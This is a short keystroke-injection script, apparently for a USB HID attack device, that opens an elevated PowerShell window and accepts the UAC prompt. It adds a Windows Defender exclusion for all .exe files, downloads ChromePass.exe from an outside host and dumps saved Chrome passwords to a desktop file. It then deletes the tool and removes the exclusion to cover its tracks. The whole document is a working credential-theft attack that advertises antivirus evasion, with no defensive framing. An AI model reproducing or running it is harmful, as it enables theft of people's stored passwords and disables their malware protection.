// Use this script to download all passwords from Chrome and output them to a .txt file on the user's desktop.
// Evades Windows Defender. Requires an admin to be logged in and UAC prompts without passwords.

//waitLED(ANY_OR_NONE) // uncomment if running on USB connection
layout("us")
press("WIN R") // open Run prompt
delay(500)
type("powershell.exe")
delay(500)
press("CTRL SHIFT ENTER") // open PS with admub
delay(1000)
press("LEFT ENTER") // say "yes" to UAC prompt
delay(7000)
type("$DesktopPath = [Environment]::GetFolderPath(\"Desktop\")\n") // set DesktopPath
delay(500)
type("Add-MpPreference -ExclusionExtension exe -Force\n") // exclude all .exe from Windows Defender
delay(500)
type("wget https://s3-us-west-1.amazonaws.com/8086.ca/ChromePass.exe -OutFile $DesktopPath/ChromePass.exe\n") // get ChromePass
delay(500)
type("cd $DesktopPath\n") // cd to Desktop
delay(500)
type(".\\ChromePass.exe /stext passwords.txt\n") // get passwords
delay(4000)
type("Remove-Item ChromePass.exe\n") // delete ChromePass
delay(500)
type("Remove-MpPreference -ExclusionExtension exe -Force\n") // remove .exe exclusion
delay(500)
type("exit\n") // quit PS window
